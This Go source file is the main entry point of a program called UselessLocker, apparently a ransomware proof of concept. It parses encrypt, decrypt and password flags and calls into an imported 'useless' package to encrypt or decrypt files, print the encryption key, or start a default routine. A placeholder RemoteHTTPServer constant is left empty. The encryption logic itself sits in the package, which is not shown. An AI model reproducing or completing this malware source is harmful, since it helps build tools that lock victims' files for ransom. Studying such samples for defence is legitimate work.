package main

import (
	"flag"
	"log"

	"github.com/TheCreeper/UselessLocker/useless"
)

// Some constants which control the behaviour of useless locker.
const (
	RemoteHTTPServer = ""
)

// Flag vars
var (
	Decrypt  bool
	Encrypt  bool
	Password string
)

func init() {
	flag.BoolVar(&Decrypt, "d", false, ".")
	flag.BoolVar(&Encrypt, "e", false, ".")
	flag.StringVar(&Password, "p", "", ".")
	flag.Parse()
}

func main() {
	if Decrypt {
		if len(Password) == 0 {
			log.Fatal("A password must be specified before continuing")
		}

		if err := useless.DecryptFiles([]byte(Password)); err != nil {
			log.Fatal(err)
		}
		return
	}

	if Encrypt {
		key, err := useless.EncryptFiles()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Encryption Key: %s\n", key)
		return
	}

	if err := useless.Start(); err != nil {
		log.Fatal(err)
	}
}
